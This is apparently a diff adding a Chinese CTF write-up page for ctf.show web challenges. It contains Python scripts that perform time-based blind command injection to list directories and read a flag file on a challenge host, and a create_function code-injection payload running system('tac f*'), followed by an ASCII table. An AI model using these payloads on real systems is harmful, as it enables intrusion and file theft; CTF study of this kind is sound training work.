+str<span class="token operator">=</span><span class="token keyword type-declaration">string</span><span class="token operator">.</span>ascii_letters<span class="token operator">+</span><span class="token keyword type-declaration">string</span><span class="token operator">.</span>digits<span class="token operator">+</span><span class="token string double-quoted-string">"-"</span><span class="token operator">+</span><span class="token string double-quoted-string">"_"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
+result<span class="token operator">=</span><span class="token string double-quoted-string">""</span>
+<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token class-name return-type">key</span><span class="token operator">=</span><span class="token number">0</span>
+    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">for</span> n in <span class="token argument-name">str</span><span class="token punctuation">:</span>
+            payload<span class="token operator">=</span><span class="token string double-quoted-string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 5;fi"</span><span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
+            <span class="token comment">#print(payload)</span>
+            url<span class="token operator">=</span><span class="token string double-quoted-string">"http://a9339791-ab7b-45fe-806e-b73bce5056b1.challenge.ctf.show:8080/?c="</span><span class="token operator">+</span>payload
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token argument-name">except</span><span class="token punctuation">:</span>
+                result<span class="token operator">=</span>result<span class="token operator">+</span>n
+                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string single-quoted-string">'9'</span><span class="token punctuation">:</span>
+                key<span class="token operator">=</span><span class="token number">1</span>
+                result<span class="token operator">+=</span><span class="token string double-quoted-string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>这个可以知道flag文件在第几行(由于网络原因可能跑不出完整的文件名)</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> string
+<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"-"</span><span class="token operator">+</span><span class="token string">"_"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
+result<span class="token operator">=</span><span class="token string">""</span>
+key <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+        payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==4'|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 4;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
+        <span class="token comment">#print(payload)</span>
+        url<span class="token operator">=</span><span class="token string">"http://a9339791-ab7b-45fe-806e-b73bce5056b1.challenge.ctf.show:8080/?c="</span><span class="token operator">+</span>payload
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            result<span class="token operator">=</span>result<span class="token operator">+</span>n
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'9'</span><span class="token punctuation">:</span>
+            result<span class="token operator">+=</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>这个可以的到第4行的flag文件的名称</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> string
+<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"-"</span><span class="token operator">+</span><span class="token string">"_"</span><span class="token operator">+</span><span class="token string">"&#123;"</span><span class="token operator">+</span><span class="token string">"&#125;"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
+result<span class="token operator">=</span><span class="token string">""</span>
+<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 5;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
+        <span class="token comment">#print(payload)</span>
+        url<span class="token operator">=</span><span class="token string">"http://a9339791-ab7b-45fe-806e-b73bce5056b1.challenge.ctf.show:8080/?c="</span><span class="token operator">+</span>payload
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            result<span class="token operator">=</span>result<span class="token operator">+</span>n
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>跑出flag</li>
+</ul>
+<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><ul>
+<li>本地测试</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshts034yxj30bm02ya9x.jpg" alt="image-20210715184648474"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshtsne6djj30aw042jrb.jpg" alt="image-20210715184721775"></p>
+<ul>
+<li>所以只需要不给$code赋值，或者延迟赋值就可达到目的</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">usleep <span class="token comment">//延迟执行函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshtu4s8f4j30oj0f60ug.jpg" alt="image-20210715184833902"></p>
+<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshv8kxezfj30uy0d1tal.jpg" alt="image-20210715193711491"></p>
+<h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><code>create_function($a,$b)</code>:</li>
+</ul>
+<p>以<code>$a</code>为参数<code>$b</code>为函数内容，构建新的函数，返回函数的名称</p>
+<p>相当于</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span>
+<span class="token operator">===</span><span class="token operator">=></span>
+<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>如果$b中出现}就会导致函数闭合，从而可以执行我们输入的新函数</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">system</span><span class="token punctuation">(</span>tac f<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//)</span>
+<span class="token operator">===</span><span class="token operator">=></span>
+<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+		<span class="token function">system</span><span class="token punctuation">(</span>tac f<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//  </span>
+<span class="token punctuation">&#125;</span>  <span class="token comment">//这个括号被前边的'//'注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>根据正则，是要检测函数收尾存在一个字符能绕过正则，并且不影响函数的执行</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshy6jbsotj60nc0gxq5402.jpg" alt="image-20210715211910807"></p>
+<p>%5c是<code>\</code>,函数在命名空间下，真正的形式是<code>\函数名</code>表示当前命名空间的函数，绕过正则</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshypm9auij30tb069t9b.jpg" alt="image-20210715213732124"></p>
+<h3 id="可显示字符-编辑"><a href="#可显示字符-编辑" class="headerlink" title="可显示字符[编辑]"></a>可显示字符[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=ASCII&action=edit&section=2">编辑</a>]</h3><table>
+<thead>
+<tr>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E8%BF%9B%E5%88%B6">十进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%BD%A2">图形</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0010 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/32">32</a></td>
+<td align="center">20</td>
+<td align="center">(<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A9%BA%E6%A0%BC">space</a>)</td>
+</tr>
+<tr>
+<td align="center">0010 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/33">33</a></td>
+<td align="center">21</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%83%8A%E5%8F%B9%E5%8F%B7">!</a></td>
+</tr>
+<tr>
+<td align="center">0010 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/34">34</a></td>
+<td align="center">22</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E5%BC%95%E5%8F%B7">“</a></td>
+</tr>
+<tr>
+<td align="center">0010 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/35">35</a></td>
+<td align="center">23</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BA%95%E5%8F%B7">#</a></td>
+</tr>
+<tr>
+<td align="center">0010 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/36">36</a></td>
+<td align="center">24</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/$">$</a></td>
+</tr>
+<tr>
+<td align="center">0010 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/37">37</a></td>
+<td align="center">25</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E6%AF%94">%</a></td>
+</tr>
+<tr>
+<td align="center">0010 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/38">38</a></td>
+<td align="center">26</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%26">&amp;</a></td>
+</tr>
+<tr>
+<td align="center">0010 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/39">39</a></td>
+<td align="center">27</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%95%E5%BC%95%E5%8F%B7">‘</a></td>
+</tr>
+<tr>
+<td align="center">0010 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/40">40</a></td>
+<td align="center">28</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%AC%E8%99%9F">(</a></td>
+</tr>
+<tr>
+<td align="center">0010 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/41">41</a></td>
+<td align="center">29</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%AC%E8%99%9F">)</a></td>
+</tr>
+<tr>
+<td align="center">0010 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/42">42</a></td>
+<td align="center">2A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%98%9F%E5%8F%B7">*</a></td>
+</tr>
+<tr>
+<td align="center">0010 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/43">43</a></td>
+<td align="center">2B</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%8F%B7">+</a></td>
+</tr>
+<tr>
+<td align="center">0010 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/44">44</a></td>
+<td align="center">2C</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%80%97%E5%8F%B7">,</a></td>
+</tr>
+<tr>
+<td align="center">0010 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/45">45</a></td>
+<td align="center">2D</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%87%8F%E5%8F%B7">-</a></td>
+</tr>
+<tr>
+<td align="center">0010 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/46">46</a></td>
+<td align="center">2E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%A5%E7%82%B9">.</a></td>
+</tr>
+<tr>
+<td align="center">0010 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/47">47</a></td>
+<td align="center">2F</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">/</a></td>
+</tr>
+<tr>
+<td align="center">0011 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/48">48</a></td>
+<td align="center">30</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/0">0</a></td>
+</tr>
+<tr>
+<td align="center">0011 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/49">49</a></td>
+<td align="center">31</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/1">1</a></td>
+</tr>
+<tr>
+<td align="center">0011 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/50">50</a></td>
+<td align="center">32</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/2">2</a></td>
+</tr>
+<tr>
+<td align="center">0011 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/51">51</a></td>
+<td align="center">33</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/3">3</a></td>
+</tr>
+<tr>
+<td align="center">0011 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/52">52</a></td>
+<td align="center">34</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/4">4</a></td>
+</tr>
+<tr>
+<td align="center">0011 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/53">53</a></td>
+<td align="center">35</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/5">5</a></td>
+</tr>
+<tr>
+<td align="center">0011 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/54">54</a></td>
+<td align="center">36</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/6">6</a></td>
+</tr>
+<tr>
+<td align="center">0011 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/55">55</a></td>
+<td align="center">37</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/7">7</a></td>
+</tr>
+<tr>
+<td align="center">0011 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/56">56</a></td>
+<td align="center">38</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/8">8</a></td>
+</tr>
+<tr>
+<td align="center">0011 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/57">57</a></td>
+<td align="center">39</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/9">9</a></td>
+</tr>
+<tr>
+<td align="center">0011 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/58">58</a></td>
+<td align="center">3A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%86%92%E5%8F%B7">:</a></td>
+</tr>
+<tr>
+<td align="center">0011 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/59">59</a></td>
+<td align="center">3B</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%8F%B7">;</a></td>
+</tr>
+<tr>
+<td align="center">0011 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/60">60</a></td>
+<td align="center">3C</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E6%96%BC%E8%99%9F">&lt;</a></td>
+</tr>
+<tr>
+<td align="center">0011 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/61">61</a></td>
+<td align="center">3D</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%AD%89%E5%8F%B7">=</a></td>
+</tr>
+<tr>
+<td align="center">0011 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/62">62</a></td>
+<td align="center">3E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A4%A7%E6%96%BC%E8%99%9F">&gt;</a></td>
+</tr>
+<tr>
+<td align="center">0011 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/63">63</a></td>
+<td align="center">3F</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%97%AE%E5%8F%B7">?</a></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E8%BF%9B%E5%88%B6">十进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%BD%A2">图形</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0100 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/64">64</a></td>
+<td align="center">40</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/@">@</a></td>
+</tr>
+<tr>
+<td align="center">0100 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/65">65</a></td>
+<td align="center">41</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/A">A</a></td>
+</tr>
+<tr>
+<td align="center">0100 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/66">66</a></td>
+<td align="center">42</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/B">B</a></td>
+</tr>
+<tr>
+<td align="center">0100 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/67">67</a></td>
+<td align="center">43</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/C">C</a></td>
+</tr>
+<tr>
+<td align="center">0100 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/68">68</a></td>
+<td align="center">44</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/D">D</a></td>
+</tr>
+<tr>
+<td align="center">0100 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/69">69</a></td>
+<td align="center">45</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/E">E</a></td>
+</tr>
+<tr>
+<td align="center">0100 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/70">70</a></td>
+<td align="center">46</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/F">F</a></td>
+</tr>
+<tr>
+<td align="center">0100 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/71">71</a></td>
+<td align="center">47</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/G">G</a></td>
+</tr>
+<tr>
+<td align="center">0100 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/72">72</a></td>
+<td align="center">48</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/H">H</a></td>
+</tr>
+<tr>
+<td align="center">0100 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/73">73</a></td>
+<td align="center">49</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/I">I</a></td>
+</tr>
+<tr>
+<td align="center">0100 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/74">74</a></td>
+<td align="center">4A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/J">J</a></td>
+</tr>
+<tr>
+<td align="center">0100 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/75">75</a></td>
+<td align="center">4B</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/K">K</a></td>
+</tr>
+<tr>
+<td align="center">0100 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/76">76</a></td>
+<td align="center">4C</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/L">L</a></td>
+</tr>
+<tr>
+<td align="center">0100 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/77">77</a></td>
+<td align="center">4D</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/M">M</a></td>
+</tr>
+<tr>
+<td align="center">0100 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/78">78</a></td>
+<td align="center">4E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/N">N</a></td>
+</tr>
+<tr>
+<td align="center">0100 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/79">79</a></td>
+<td align="center">4F</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/O">O</a></td>
+</tr>
+<tr>
+<td align="center">0101 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/80">80</a></td>
+<td align="center">50</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/P">P</a></td>
+</tr>
+<tr>
+<td align="center">0101 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/81">81</a></td>
+<td align="center">51</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Q">Q</a></td>
+</tr>
+<tr>
+<td align="center">0101 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/82">82</a></td>
+<td align="center">52</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/R">R</a></td>
+</tr>
+<tr>
+<td align="center">0101 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/83">83</a></td>
+<td align="center">53</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/S">S</a></td>
+</tr>
+<tr>
+<td align="center">0101 0100</td>
